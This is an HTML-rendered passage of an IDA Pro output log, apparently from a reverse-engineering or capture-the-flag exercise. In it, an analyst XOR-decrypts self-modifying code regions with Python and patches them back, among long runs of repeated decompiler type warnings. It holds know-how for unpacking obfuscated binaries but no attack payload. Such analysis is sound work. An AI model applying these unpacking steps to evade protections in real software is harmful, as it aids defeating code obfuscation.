\xff\xff\xffH\x89\xc7H\xb8\xd0\x87H\x00\x00\x00\x00\x00\xff\xd0H\x89E\xe0H\x8bE\xe0H\x89\xc7H\xb8@x@\x00\x00\x00\x00\x00\xff\xd0H\x89\xc2H\x8dE\xb0H\x89\xd6H\x89\xc7H\xb8\xc8u@\x00\x00\x00\x00\x00\xff\xd0H\x8dE\x90H\x8dU\xb0H\x89\xd6H\x89\xc7H\xb8&gt;u@\x00\x00\x00\x00\x00\xff\xd0H\x8dE\x90H\xbe\xa8q\\\x00\x00\x00\x00\x00H\x89\xc7H\xb8\x95~@\x00\x00\x00\x00\x00\xff\xd0\x89\xc3H\x8dE\x90H\x89\xc7H\xb80\xeeF\x00\x00\x00\x00\x00\xff\xd0H\x8dE\xb0H\x89\xc7H\xb8&amp;s@\x00\x00\x00\x00\x00\xff\xd0\x84\xdb\x0f\x84\xb3\x00\x00\x00H\x8bE\xe0H\x89\xc7H\xb8@x@\x00\x00\x00\x00\x00\xff\xd0H\x89\xc7H\xb8\x9as@\x00\x00\x00\x00\x00\xff\xd0H\xba@\x9d\\\x00\x00\x00\x00\x00H\x89\x02H\xb8@\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\xbe\xbcq\\\x00\x00\x00\x00\x00H\x89\xc7H\xb8\xd0\xf5M\x00\x00\x00\x00\x00\xff\xd0H\xba\x08\x9d\\\x00\x00\x00\x00\x00H\x89\x02H\xb8\x08\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\xba@q\\\x00\x00\x00\x00\x00H\xbe\xb8q\\\x00\x00\x00\x00\x00H\x89\xc7\xb8\x00\x00\x00\x00H\xb9\xb0\nM\x00\x00\x00\x00\x00\xff\xd1H\xb8\x08\x9d\\\x00\x00\x00\x00\x00H\x8b\x00H\x89\xc7H\xb8\x80\xeeM\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85 \xff\xff\xffH\x89\xc7H\xb8@\x88H\x00\x00\x00\x00\x00\xff\xd0\xe9]\xfe\xff\xffH\x8d\x85\x10\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85 \xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x850\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0\xe9\x9a\x00\x00\x00H\x89\xc3H\x8d\x85@\xff\xff\xffH\x89\xc7H\xb8&amp;s@\x00\x00\x00\x00\x00\xff\xd0H\x89\xd8H\x89\xc7H\xb8\xa0\x00K\x00\x00\x00\x00\x00\xff\xd0H\x89\xc3H\x8dE\xb0H\x89\xc7H\xb8&amp;s@\x00\x00\x00\x00\x00\xff\xd0\xeb\x03H\x89\xc3H\x8d\x85\x10\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x85 \xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x8d\x850\xff\xff\xffH\x89\xc7H\xb8tx@\x00\x00\x00\x00\x00\xff\xd0H\x89\xd8H\x89\xc7H\xb8\xa0\x00K\x00\x00\x00\x00\x00\xff\xd0H\x8b]\xf8\xc9\xc3\x13&#x27;</span><br><span class="line">Python&gt;a = bytes(a)</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5C7206,a)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">401000: using guessed type __int64 init_proc(void);</span><br><span class="line">406230: using guessed type __int64 __fastcall GLOBAL__sub_I_cxx11_locale_inst_cc(_QWORD, _QWORD, _QWORD);</span><br><span class="line">5BD728: using guessed type __int64 (__fastcall *_frame_dummy_init_array_entry[2])();</span><br><span class="line">5BD790: using guessed type __int64 (__fastcall *_do_global_dtors_aux_fini_array_entry[2])();</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Command &quot;MakeArray&quot; failed</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">5C747F: variable &#x27;v2&#x27; is possibly undefined</span><br><span class="line">5C747F: variable &#x27;v3&#x27; is possibly undefined</span><br><span class="line">40792A: using guessed type __int64 __fastcall std::filesystem::__cxx11::operator!=(_QWORD, _QWORD);</span><br><span class="line">407987: using guessed type __int64 __fastcall std::filesystem::__cxx11::begin(_QWORD, _QWORD);</span><br><span class="line">4079DA: using guessed type __int64 __fastcall std::filesystem::__cxx11::end(_QWORD, _QWORD);</span><br><span class="line">407D1C: using guessed type __int64 __fastcall std::filesystem::__cxx11::path::path&lt;char [2],std::filesystem::__cxx11::path&gt;(_QWORD, _QWORD, _QWORD);</span><br><span class="line">407E95: using guessed type __int64 __fastcall std::operator==&lt;char&gt;(_QWORD, _QWORD);</span><br><span class="line">4887D0: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator*(_QWORD);</span><br><span class="line">488840: using guessed type __int64 __fastcall std::filesystem::__cxx11::directory_iterator::operator++(_QWORD);</span><br><span class="line">4D0AB0: using guessed type __int64 __fastcall _isoc99_fscanf(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, char);</span><br><span class="line">4DEE80: using guessed type __int64 __fastcall fclose(_QWORD);</span><br><span class="line">4DF5D0: using guessed type __int64 __fastcall fopen64(_QWORD, _QWORD);</span><br><span class="line">Python&gt;b = [ch^0x13 for ch in list(get_bytes(0x5c75c6,0x160))]</span><br><span class="line">Python&gt;b</span><br><span class="line">[0x75, 0x68, 0xa9, 0xc5, 0xe7, 0x65, 0xd8, 0x44, 0x20, 0x20, 0x20, 0xe7, 0x65, 0xdc, 0x20, 0x20, 0x20, 0x20, 0xab, 0x65, 0xdc, 0x1b, 0x65, 0xd8, 0x2f, 0xad, 0x1e, 0x21, 0x20, 0x20, 0x68, 0x9a, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0xab, 0x65, 0xdc, 0x68, 0xb8, 0x2f, 0x96, 0x24, 0x22, 0xe0, 0xc8, 0x24, 0xa9, 0xe1, 0xab, 0x65, 0xdc, 0xa3, 0xe0, 0x21, 0x68, 0x9a, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x68, 0xb8, 0x2f, 0x96, 0x24, 0x22, 0x2f, 0x96, 0xe0, 0xe1, 0xc0, 0x24, 0x21, 0xe8, 0xa8, 0x65, 0xd7, 0xab, 0x65, 0xdc, 0xa3, 0xe0, 0x21, 0x68, 0x9a, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x68, 0xb8, 0x2f, 0x96, 0x24, 0x22, 0xe0, 0xc8, 0x24, 0xa9, 0xe1, 0x68, 0x9a, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0xab, 0x65, 0xdc, 0x68, 0xb8, 0x2f, 0x96, 0x24, 0x22, 0x2f, 0x96, 0xe0, 0xe1, 0xc0, 0x24, 0x21, 0xe8, 0xa8, 0x65, 0xd6, 0x2f, 0x96, 0x65, 0xd7, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa8, 0x65, 0xd7, 0x2f, 0x96, 0x65, 0xd7, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa8, 0x65, 0xd7, 0x2f, 0x96, 0x65, 0xd7, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd7, 0x21, 0xe0, 0xa8, 0x65, 0xd7, 0x2f, 0x96, 0x65, 0xd6, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd6, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd6, 0x21, 0xe0, 0xa8, 0x65, 0xd6, 0x2f, 0x96, 0x65, 0xd6, 0xa4, 0xe0, 0x59, 0x2b, 0x2f, 0x96, 0x65, 0xd6, 0x21, 0xe0, 0xa3, 0xe8, 0x21, 0xcb, 0x26, 0x2f, 0x96, 0x65, 0xd6, 0x21, 0xe0, 0xa8, 0x65, 0xd6, 0xa0, 0x55, 0xd7, 0x33, 0xa0, 0x55, 0xd6, 0x17, 0x68, 0x99, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0xab, 0x65, 0xdc, 0x68, 0xb8, 0x2f, 0x96, 0x75, 0xd7, 0xa8, 0x34, 0x21, 0xab, 0x65, 0xdc, 0xa3, 0xe0, 0x21, 0x68, 0x99, 0x60, 0x51, 0x7c, 0x20, 0x20, 0x20, 0x20, 0x20, 0x68, 0xb8, 0x2f, 0x96, 0x75, 0xd6, 0xa8, 0x34, 0x21, 0xa3, 0x65, 0xdc, 0x22, 0xc9, 0x96, 0xde, 0xdf, 0xdf, 0xb0, 0x7d, 0xe3, 0x13]</span><br><span class="line">Python&gt;b = bytes([ch^0x13 for ch in list(get_bytes(0x5c75c6,0x160))])</span><br><span class="line">Python&gt;b</span><br><span class="line">b&#x27;uh\xa9\xc5\xe7e\xd8D   \xe7e\xdc    \xabe\xdc\x1be\xd8/\xad\x1e!  h\x9a`Q|     \xabe\xdch\xb8/\x96$&quot;\xe0\xc8$\xa9\xe1\xabe\xdc\xa3\xe0!h\x9a`Q|     h\xb8/\x96$&quot;/\x96\xe0\xe1\xc0$!\xe8\xa8e\xd7\xabe\xdc\xa3\xe0!h\x9a`Q|     h\xb8/\x96$&quot;\xe0\xc8$\xa9\xe1h\x9a`Q|     \xabe\xdch\xb8/\x96$&quot;/\x96\xe0\xe1\xc0$!\xe8\xa8e\xd6/\x96e\xd7\xa4\xe0Y+/\x96e\xd7!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd7!\xe0\xa8e\xd7/\x96e\xd7\xa4\xe0Y+/\x96e\xd7!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd7!\xe0\xa8e\xd7/\x96e\xd7\xa4\xe0Y+/\x96e\xd7!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd7!\xe0\xa8e\xd7/\x96e\xd6\xa4\xe0Y+/\x96e\xd6!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd6!\xe0\xa8e\xd6/\x96e\xd6\xa4\xe0Y+/\x96e\xd6!\xe0\xa3\xe8!\xcb&amp;/\x96e\xd6!\xe0\xa8e\xd6\xa0U\xd73\xa0U\xd6\x17h\x99`Q|     \xabe\xdch\xb8/\x96u\xd7\xa84!\xabe\xdc\xa3\xe0!h\x99`Q|     h\xb8/\x96u\xd6\xa84!\xa3e\xdc&quot;\xc9\x96\xde\xdf\xdf\xb0&#125;\xe3\x13&#x27;</span><br><span class="line">Python&gt;patch_bytes(0x5C75C6,b)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">NameError: name &#x27;patch_bytes&#x27; is not defined</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5C75C6,b)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Python&gt;b = bytes([ch^0x33 for ch in list(get_bytes(0x5c75c6,0x160))])</span><br><span class="line">Python&gt;b</span><br><span class="line">b&#x27;F[\x9a\xf6\xd4V\xebw\x13\x13\x13\xd4V\xef\x13\x13\x13\x13\x98V\xef(V\xeb\x1c\x9e-\x12\x13\x13[\xa9SbO\x13\x13\x13\x13\x13\x98V\xef[\x8b\x1c\xa5\x17\x11\xd3\xfb\x17\x9a\xd2\x98V\xef\x90\xd3\x12[\xa9SbO\x13\x13\x13\x13\x13[\x8b\x1c\xa5\x17\x11\x1c\xa5\xd3\xd2\xf3\x17\x12\xdb\x9bV\xe4\x98V\xef\x90\xd3\x12[\xa9SbO\x13\x13\x13\x13\x13[\x8b\x1c\xa5\x17\x11\xd3\xfb\x17\x9a\xd2[\xa9SbO\x13\x13\x13\x13\x13\x98V\xef[\x8b\x1c\xa5\x17\x11\x1c\xa5\xd3\xd2\xf3\x17\x12\xdb\x9bV\xe5\x1c\xa5V\xe4\x97\xd3j\x18\x1c\xa5V\xe4\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe4\x12\xd3\x9bV\xe4\x1c\xa5V\xe4\x97\xd3j\x18\x1c\xa5V\xe4\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe4\x12\xd3\x9bV\xe4\x1c\xa5V\xe4\x97\xd3j\x18\x1c\xa5V\xe4\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe4\x12\xd3\x9bV\xe4\x1c\xa5V\xe5\x97\xd3j\x18\x1c\xa5V\xe5\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe5\x12\xd3\x9bV\xe5\x1c\xa5V\xe5\x97\xd3j\x18\x1c\xa5V\xe5\x12\xd3\x90\xdb\x12\xf8\x15\x1c\xa5V\xe5\x12\xd3\x9bV\xe5\x93f\xe4\x00\x93f\xe5$[\xaaSbO\x13\x13\x13\x13\x13\x98V\xef[\x8b\x1c\xa5F\xe4\x9b\x07\x12\x98V\xef\x90\xd3\x12[\xaaSbO\x13\x13\x13\x13\x13[\x8b\x1c\xa5F\xe5\x9b\x07\x12\x90V\xef\x11\xfa\xa5\xed\xec\xec\x83N\xd0 &#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5C75C6,b)</span><br><span class="line">Command &quot;MakeCode&quot; failed</span><br><span class="line">Command &quot;JumpEnter&quot; failed</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Python&gt;b = bytes([ch^0x33 for ch in list(get_bytes(0x5c75c6,0x160))])</span><br><span class="line">Python&gt;b</span><br><span class="line">b&#x27;UH\x89\xe5\xc7E\xf8d\x00\x00\x00\xc7E\xfc\x00\x00\x00\x00\x8bE\xfc;E\xf8\x0f\x8d&gt;\x01\x00\x00H\xba@q\\\x00\x00\x00\x00\x00\x8bE\xfcH\x98\x0f\xb6\x04\x02\xc0\xe8\x04\x89\xc1\x8bE\xfc\x83\xc0\x01H\xba@q\\\x00\x00\x00\x00\x00H\x98\x0f\xb6\x04\x02\x0f\xb6\xc0\xc1\xe0\x04\x01\xc8\x88E\xf7\x8bE\xfc\x83\xc0\x01H\xba@q\\\x00\x00\x00\x00\x00H\x98\x0f\xb6\x04\x02\xc0\xe8\x04\x89\xc1H\xba@q\\\x00\x00\x00\x00\x00\x8bE\xfcH\x98\x0f\xb6\x04\x02\x0f\xb6\xc0\xc1\xe0\x04\x01\xc8\x88E\xf6\x0f\xb6E\xf7\x84\xc0y\x0b\x0f\xb6E\xf7\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf7\x01\xc0\x88E\xf7\x0f\xb6E\xf7\x84\xc0y\x0b\x0f\xb6E\xf7\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf7\x01\xc0\x88E\xf7\x0f\xb6E\xf7\x84\xc0y\x0b\x0f\xb6E\xf7\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf7\x01\xc0\x88E\xf7\x0f\xb6E\xf6\x84\xc0y\x0b\x0f\xb6E\xf6\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf6\x01\xc0\x88E\xf6\x0f\xb6E\xf6\x84\xc0y\x0b\x0f\xb6E\xf6\x01\xc0\x83\xc8\x01\xeb\x06\x0f\xb6E\xf6\x01\xc0\x88E\xf6\x80u\xf7\x13\x80u\xf67H\xb9@q\\\x00\x00\x00\x00\x00\x8bE\xfcH\x98\x0f\xb6U\xf7\x88\x14\x01\x8bE\xfc\x83\xc0\x01H\xb9@q\\\x00\x00\x00\x00\x00H\x98\x0f\xb6U\xf6\x88\x14\x01\x83E\xfc\x02\xe9\xb6\xfe\xff\xff\x90]\xc33&#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5C75C6,b)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">5C75C6: using guessed type __int64 __fastcall sub_5C75C6();</span><br><span class="line">401000: using guessed type __int64 init_proc(void);</span><br><span class="line">406230: using guessed type __int64 __fastcall GLOBAL__sub_I_cxx11_locale_inst_cc(_QWORD, _QWORD, _QWORD);</span><br><span class="line">5BD728: using guessed type __int64 (__fastcall *_frame_dummy_init_array_entry[2])();</span><br><span class="line">5BD790: using guessed type __int64 (__fastcall *_do_global_dtors_aux_fini_array_entry[2])();</span><br><span class="line">Python&gt;c = bytes([ch^0x37 for ch in list(get_bytes(0x5c75c6,0x160))])</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Python&gt;c</span><br><span class="line">b&#x27;b\x7f\xbe\xd2\xf0r\xcfS777\xf0r\xcb7777\xbcr\xcb\x0cr\xcf8\xba\t677\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc0\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc18\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc18\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc1\xb7B\xc0$\xb7B\xc1\x00\x7f\x8ewFk77777\xbcr\xcb\x7f\xaf8\x81b\xc0\xbf#6\xbcr\xcb\xb4\xf76\x7f\x8ewFk77777\x7f\xaf8\x81b\xc1\xbf#6\xb4r\xcb5\xde\x81\xc9\xc8\xc8\xa7j\xf4\x04&#x27;</span><br><span class="line">Python&gt;c</span><br><span class="line">b&#x27;b\x7f\xbe\xd2\xf0r\xcfS777\xf0r\xcb7777\xbcr\xcb\x0cr\xcf8\xba\t677\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc0\xbcr\xcb\xb4\xf76\x7f\x8dwFk77777\x7f\xaf8\x8135\xf7\xdf3\xbe\xf6\x7f\x8dwFk77777\xbcr\xcb\x7f\xaf8\x81358\x81\xf7\xf6\xd736\xff\xbfr\xc18\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc0\xb3\xf7N&lt;8\x81r\xc06\xf7\xb4\xff6\xdc18\x81r\xc06\xf7\xbfr\xc08\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc18\x81r\xc1\xb3\xf7N&lt;8\x81r\xc16\xf7\xb4\xff6\xdc18\x81r\xc16\xf7\xbfr\xc1\xb7B\xc0$\xb7B\xc1\x00\x7f\x8ewFk77777\xbcr\xcb\x7f\xaf8\x81b\xc0\xbf#6\xbcr\xcb\xb4\xf76\x7f\x8ewFk77777\x7f\xaf8\x81b\xc1\xbf#6\xb4r\xcb5\xde\x81\xc9\xc8\xc8\xa7j\xf4\x04&#x27;</span><br><span class="line">Python&gt;ida_bytes.patch_bytes(0x5c7766,c)</span><br><span class="line">Caching &#x27;Functions window&#x27;... ok</span><br><span class="line">Caching &#x27;Strings window&#x27;... ok</span><br><span class="line">Python&gt;c</span><br><span 